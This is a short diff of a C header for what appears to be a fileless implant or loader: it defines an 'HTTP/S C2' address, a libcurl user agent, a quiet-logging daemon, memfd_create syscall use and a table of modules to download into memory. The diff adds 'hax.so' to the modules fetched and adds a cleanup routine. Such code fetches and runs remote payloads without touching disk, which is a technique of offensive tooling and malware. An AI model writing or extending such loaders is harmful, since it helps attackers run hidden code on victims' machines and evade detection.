@@ -15,6 +15,7 @@
 #define ZCURL_AGENT "libcurl-agent/1.0"    // UA-Agent
 
 #define SHM_NAME " "                       // memfd:<...>
+#define SHM_NAME_MAX 254                   
 #define __NR_memfd_create 319              // https://code.woboq.org/qt5/include/asm/unistd_64.h.html
 
 // Global daemon log
@@ -23,7 +24,7 @@ int logquiet = 1;                          // 1 - no stderr whatsoever, 0 - stde
 FILE *fp;
 
 // Initial modules to download to memory
-char *modules[] = { /*"libsqlite3.so"*/ };
+char *modules[] = { "hax.so" };
 //
 // HTTP/S C2
 char *ccurl="http://127.0.0.1:8080/";
@@ -37,7 +38,7 @@ char *ccurl="http://127.0.0.1:8080/";
 
 // ShMemTbl List
 typedef struct node {
-    char mname[256];
+    char mname[SHM_NAME_MAX];
     char mpath[1024];
     char mstate[2];
     int  fd;
@@ -45,7 +46,7 @@ typedef struct node {
 } node_t;
 
 typedef struct modtbl {
-    char mname[256];
+    char mname[SHM_NAME_MAX];
     char mpath[1024];
     char mstate[2];
     int  fd;
@@ -63,6 +64,7 @@ memfd_kv memfd_kv_s = {0,0,0};
 // Curl Shared Memory write callback
 typedef struct {
  int shm_fd;
+ char shm_name[SHM_NAME_MAX];
 } Shared_Mem_Fd;
 
 
@@ -102,6 +104,7 @@ char* mod_name2path(node_t * head, char * name);
 int   mod_name2fd(node_t * head, char * name, int loaded);
 void  load_so_path(char* path);
 void  doWork(void);
+void  cleanup_os_resources(int shm_fd);
 
 
 #endif //_HAVE_ZAF_H
